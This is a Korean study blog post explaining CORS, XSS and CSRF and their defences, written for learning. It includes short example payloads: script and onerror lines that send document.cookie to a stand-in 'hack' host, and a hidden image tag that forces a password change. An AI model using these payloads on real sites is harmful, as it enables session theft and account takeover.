---
title: WebSecurity (CORS+XSS+CSRF)
date: 2021-10-70 08:44
category: programming
draft: false
---

찾던 중 [PortSwigger](https://portswigger.net/)라는 사이트를 알게 되었는데 굉장히 다양한 공격법들에 대해서 설명해주고 있다. 한번 쯤 읽어보면 좋을 것 같다.

## CORS (Cross-Origin Resource Sharing)

지정된 도메인 외부에 있는 리소스에 대한 액세스를 제어하는 브라우저 메커니즘

SOP + 유연성

### SOP (Same Origin Policy)

- 웹사이트 간에 서로 간의 공격을 방지하는 것을 목표로 한 정책

- 브라우저는 `SOP`를 통해 다른 `origin`의 리소스에 대해서는 접근을 금지하도록 함.

**예시**

이 정책이 없다면, 내 구글의 개인 정보가 다른 악성 사이트에서 접근할 수 있다.

**origin**

`URI scheme(protocol)`, `domain`, `port`로 구성된다. 단, `port`의 경우 `http`, `https`의 기본 포트가 정해져있기 때문에 생략되는 경우도 있다.

### Access-Control-Allow-Origin

**CORS**는 `SOP`만으로는 서비스를 구성하는게 현실적으로 불가능하기 때문에 외부 리소스 사용을 위한 예외 조항이다.

`Access-Control-Allow-Origin: https://somesite.com:443`

이 때 와일드 카드를 사용할 수 있으나, 사용을 지양해야한다. `CSRF`공격을 막아낼 수가 없다. 내부 네트워크이더라도 네트워크 망만으로는 취약점이 발생할 수 있다. 또한 하위 도메인의 경우에도 와일드 카드를 사용하게 된다면, 액세스 권한이 넘어갈 수 있다.

`Access-Control-Allow-Origin: https://*-somesite.com`

`hack-somsite.com`

### Preflight Check

- 실제 요청 전에 `OPTIONS`를 통한 요청을 먼저 보내서, 실제 요청 전송 여부에 대하여 판단한다. 이 `Preflight Request`에 대해서 서버는 `Access-Control-Allow-Origin`을 포함하여 응답을 내리게 되는데, 브라우저는 이를 비교하여 실제 요청을 보낼지에 대해 판단하게 된다.
  당연히 이 왕복요청에 대해서는 오버헤드가 발생하게 되는데 이를 skip할 수 있다.

- 다만 skip을 위해선 아래 3가지 조건을 만족해야 한다.

  - `Method`는 `GET`, `HEAD`, `POST` 중 하나

  - 헤더에는

    `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`, `DPR`, `Downlink`, `Save-Data`, `Viewport-Width`, `Width` 만 사용 가능하다.

  - `Content-Type`은 `apllication/x-www-form-urlencoded`, `multipart/form-data`, `text/plain` 만 가능하다.

- 즉 `json`은 택도 없으며, `Authorization`또한 택도 없다 ㅎ

### Credentialed Request

- 예외적인 케이스이지만 `fetch API` 혹은 `XMLHttpRequest`를 사용할 때 일어나는 요청이다.

- 두 요청은 별도의 옵션(credentials)을 통해서 인증 정보를 요청에 담을지 판단하게 된다.

- 해당 옵션에 인증 정보를 포함하도록 한다면, CORS정책은 두가지 룰이 추가되게 된다.

  - `Access-Control-Allow-Origin: *` 금지, 명시적 URL을 지정해야한다.

  - `Access-Control-Allow-Credentials: true` 로 지정해주어야 한다.

### CORS 의 취약점

1. `Basic Origin Reflection`
   - 요청 응답에 `origin`에 대한 정보가 있어 이를 이용해서 `CORS`를 지키면서 요청을 보낼 수 있다.
2. 하위 도메인 와일드카드
   - 위에서 말한 것 처럼 귀찮다고 `*-somesite.com` 이런거 `origin`에 넣으면 안된다. 와일드 카드는 지양한다.
3. `null` 요청 허용의 경우
   - `origin`에는 `null` 또한 설정할 수 있는데 이렇게 되면 `iframe` 같은거로 뚫을 수 있다.
4. `XSS`
   - `CORS`의 기반은 출처간의 신뢰성이다. 한쪽이 `XSS`로 인해 신뢰가 없어진다면 당연히 `CORS` 또한 유효할 수 없다.
5. Breaking TLS with poorly configured CORS

   - `HTTPS`를 엄격하게 쓰더라도 `HTTP`쪽을 화이트리스트로 등록해두면 이또한 위험요소가 될 수 있다.

6. 자격증명이 없는 인트라넷
   - 간혹 인트라넷이 낮은 보안 표준이라면, 이또한 뚫릴 위험이 있다.

### 보안 방법

- 계속 말하게 되는 `Access-Control-Allow-Origin` 관리를 잘 할 것 (지속적인 관리가 필요하다.)
- `null` 허용은 최대한 피하도록 하자.
- 인트라넷이라고 와일드카드 쓰면 안된다. 인트라넷 구성만으로는 부족함이 있다.
- 요청은 얼마든지 변조될 수 있다. `CORS`가 서버 보안을 해준다고 생각하면 안된다. (별도로 보안책을 강구해두자.)

### Reference

- [What is CORS](https://portswigger.net/web-security/cors)
- [CORS는 왜 이렇게 우리를 힘들게 하는걸까?](https://evan-moon.github.io/2020/05/21/about-cors/)

## XSS (Cross Site Scripting)

해커가 웹페이지에 악성 스크립트를 삽입하는 형태의 공격.

스크립트를 심는 방법이 매우 다양하기 때문에 신경쓸게 많은 부분이라고 함.

종류는 아래 3가지 방법이 있다.

### Stored XSS (Persistent XSS)

- 악성스크립트를 DB에 저장되도록 하여, 영구적으로 (지속적으로) 해당 스크립트가 열람 유저들에게 실행되어 데이터를 탈취 혹은 리디렉션 하게 되는 공격이다.

- `text-area` 뿐만아니라, 악성 스크립트가 저장되고 노출되기만 하면 동작되기 때문에 다양한 부분에서 공격이 일어날 수 있다.

**예시**

`<p>{users message}</p>` 형태의 데이터에 `<p><script src="hack.js"></script></p>` 의 형태로 스크립트를 심어 해당 HTML을 읽는 브라우저에서 해킹을 시도한다.

### Reflected XSS

- 서버로부터 반사되어 오는 값을 이용한 해킹시도 방법이다.

**예시**

- `https://someservice.com/lists?args=<script>location.href="https://hack/cookie={document.cookie}"</script>` 의 형태로 특정 요청을 해킹해서 사용자의 데이터를 탈취 할 수 있다.

### DOM Based XSS

- 브라우저가 HTML을 읽는 과정에서 해킹 코드를 실행해서 탈취해간다.
- 이는 서버에서 탐지가 안되기 때문에 프론트엔드 단에서 처리해주어야 한다.

**예시**

`<img src="never_exists_img" onerror="https://hack/cookie={document.cookie}"` 의 형태로 돔레벨에서 에러를 일으켜서 탈취할 수 있다.

### 보안 방법

- 사용자 입력이 들어가는 부분에 대해서 `validate`를 확실하게 하여 필터링 해낸다.
- `HTTP Response`에서 `encode`하여 `active content`가 되지 않도록 한다. 예시) `<` :: `&lt;`
- `Content-Type`, `X-Content-Type-Options` 등을 이용하여 브라우저가 의도한 대로 응답을 해석하도록 유도한다.

- `CSP`를 사용하는 웹에서는 `XSS`같은 동작이 포함되어 있으면 이를 방지할 수 있다.

### 의문점

1. `SQL injection`이랑 뭐가 다른지??
   - `SQL injection`은 DB가 타겟임. `XSS`는 사용자가 타겟임

### Reference

[What is cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)

[동빈나 유튜브 - XSS 공격의 개요](https://www.youtube.com/watch?v=DoN7bkdQBXU)

## CSRF (Cross Site Request Forgery)

CSRF공격의 핵심

- 권한을 탈취하는 것은 불가능하다.
- 따라서 이미 신뢰를 받은 브라우저를 통해 특정 행위를 하도록 유도한다.

### 공격 방법

- 패킷정보를 탈취해서 특정 동작을 일으키는 요청에 대해서 해커가 알아낸다.

- 메일 등을 이용해 자동으로 로그인 되어 있는 사이트를 통해 특정 동작(게시글 등록, 비밀번호 변경 등)을 일으키는 스크립트를 심어 넣는다.

- 특정 이용자는 해당 스크립팅이 되어 있는 매개체를 통해서 그 동작이 일어나게 된다.

**예시**

`<img src="http://somesite.com/changeUser?id=aaa&password=aaa" width="0" height="0">` 와 같은 육안으로 노출되지 않는 특정 스크립트(iframe 등)를 동봉하여 메일 등을 보낸다.

### 보안 방법

portswigger 포스트에 게시된 `CSRF`의 전제조건은 다음 세가지로 제시하고 있다. 즉 세 가지를 막는 것이 보안점이라 생각하면 될 것 같다.

- **A relevant action.** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).
- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.

1번을 예시로 타겟이 될만한 액션을 없애는 것은 서비스 상 불가능 할 수 있으나 아래를 통해 보안을 취할 수 있는 부분은 있다.

1. `Referer` 검증
   1. 위 예시로 든 경우만 하더라도 `referer` 체크를 통해서 `somesite`를 통한 요청이 아닌 경우는 차단할 수 있다.
2. `CSRF` 토큰
   1. 특정 `form`페이지에 대한 요청을 할 경우 `CSRF토큰`을 생성해서, `POST` 등 `form submit`에 대한 요청에 대해서 해당 토큰을 검증한다.
   2. 토큰을 세션에 저장 한 후에 토큰이 동일한지 검증
   3. 따라서 Cookie나 Local storage에 기반하는 방식이 아닌 CSRF 토큰은 위의 전제조건을 방지 할 수 있다. (**Cookie-based session handling** , **No unpredictable request parameters**)

### CSRF Token

1. 토큰은 `significant entropy`를 가져야하며 예측불가능하여야 한다.
2. 타임스탬프와 함께 `cryptographic strength pseudo-random number generator`를 이용해야 한다.
3. 비밀리에 취급되어야 한다.

### 의문점

1. `JWT`를 쓰는데 왜 `CSRF` 토큰까지 필요한가??
   - `JWT`는 일반적으로 `local storage`에 보관하게 된다. `Local storage`는 스크립트를 통해 정보를 취할 수 있기 때문에 이는 `XSS`공격으로부터 자유롭지 못하다. 즉 `XSS공격`에 취약점이 있을 경우 `JWT`만으론 부족함이 있다. 반대로 쿠키에 저장하게 될 경우 `CSRF` 공격으로부터 취약점이 생기게 됨으로, 웹사이트에서 쓰이고 있는 `JWT`만으로는 부족함이 있다. (어디에 저장했든 해당 `JWT`를 별도로 `Authorization` 헤더에 넣는 방법도 있겠지만 어쨌든 `XSS` 공격은은 `JWT`를 탈취해갈 수 있다. 결국 `XSS`를 막는게 가장 중요하다. 가장 빈번하면서도 가장 다양한 공격)

### Reference

[What is CSRF - portswigger](https://portswigger.net/web-security/csrf)

[What is CSRF Tokens](https://portswigger.net/web-security/csrf/tokens)
